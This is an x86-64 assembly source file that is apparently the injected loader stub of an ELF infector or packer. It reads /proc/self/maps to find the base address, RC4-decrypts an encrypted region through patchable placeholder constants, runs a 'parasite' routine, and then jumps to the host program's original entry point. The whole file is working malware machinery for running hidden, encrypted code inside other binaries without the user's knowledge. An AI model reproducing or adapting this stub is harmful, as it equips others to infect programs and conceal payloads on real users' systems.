BITS 64

global _start

SYS_READ	equ 0
SYS_WRITE	equ 1
SYS_OPEN	equ 2
SYS_CLOSE	equ 3
SYS_LSEEK	equ 8
SYS_EXIT	equ 60
ALLOC_SPACE	equ 16

section .text

_start:

	push rax
	push rcx
	push rdx
	push rdi
	push r11
	push r12

	call get_base_addr

	; _rc4(void *bytes, uint64_t length, const char *key, uint32_t keysz);
	mov ecx, 0x55555555			; key size
	mov rdx, 0x4444444444444444	; key ptr
	add rdx, rbx
	mov rsi, 0x1942194219421942	; text size
	mov rdi, 0x2222222222222222	; text addr
	add rdi, rbx
	mov r8, 0x1919191919191919	; rc4 offset
	add r8, rbx
	call r8

	mov r8, 0x4242424242424242	; parasite offset
	call isso
	cmp rax, 0
	je .call_parasite
	add r8, rbx

.call_parasite:
	call r8

	mov r8, 0x3333333333333333
	call isso
	cmp rax, 0
	je .end_payload
	add r8, rbx

.end_payload:
	pop r12
	pop r11
	pop rdi
	pop rdx
	pop rcx
	pop rax

	jmp r8

isso:
	mov rax, 0xAAAAAAAAAAAAAAAA
	ret

get_base_addr:
	xor rax, rax
	xor rdi, rdi

	;
	; int open(const char *pathname, int flags)
	;
	xor rsi, rsi				; == rsi = O_RDONLY
	lea	rdi, [rel filepath]
	mov rax, SYS_OPEN			; syscall number for open()
	syscall

	cmp eax, 0
	jl .open_error

	push rax					; save fd

	xor r10, r10				; Zeroing out temporary registers
	xor r8, r8
	xor rdi, rdi
	xor rbx, rbx
	xor rdx, rdx

	sub sp, ALLOC_SPACE			; allocate space for /proc/<pid>/maps memory address string
								; (Max 16 chars from file | usually 12 chars 5567f9154000)
	;
	; int read(int fd, void *buf, int n)
	;
	mov rdx, 1
	lea rsi, [rsp]				; *buf  : get the content to be read on stack
	mov edi, eax				; fd    : al

.read_characters:
	xor rax, rax
	syscall

	cmp BYTE [rsp], '-'
	je .done
	inc r10b
	mov r8b, BYTE [rsp]

	cmp r8b, '9'
	jle .digit_found

.alphabet_found:
	sub r8b, 0x57				; R8 stores the extracted byte (0x62('b') - 0x57 = 0xb)
	jmp .load_into_rbx

.digit_found:
	sub r8b, '0'				; r8 stores Extracted byte

.load_into_rbx:
	shl rbx, 4
	or rbx, r8

.loop:
	add rsp, 1					; increment RSI to read character at next location
	lea rsi, [rsp]
	jmp .read_characters

.done:
	sub sp, r10w				; subtract stack pointer by no. of chars (which are pushed on stack)
	add sp, ALLOC_SPACE			; add 16 bytes to RSP (which were reserved for reading address chars)

	;
	; close(fd)
	;
	pop rdi
	mov rax, SYS_CLOSE
	syscall

	ret

.open_error:
	;
	; exit(1)
	;
	mov rdi, 1
	mov rax, SYS_EXIT
	syscall

filepath: db "/proc/self/maps",0
